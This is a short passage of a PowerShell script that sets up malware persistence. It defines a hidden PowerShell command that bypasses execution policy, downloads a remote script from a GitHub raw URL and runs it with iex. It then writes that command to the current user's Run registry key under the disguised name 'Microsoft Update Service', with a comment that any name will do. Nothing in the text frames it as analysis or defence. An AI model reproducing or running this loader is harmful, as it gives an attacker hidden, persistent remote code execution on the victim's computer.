...
$registryCommand = "powershell -w hidden -ep bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bangbangme/loko/refs/heads/main/ah.ps1')\""
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryValueName = "Microsoft Update Service" # Or any name you want
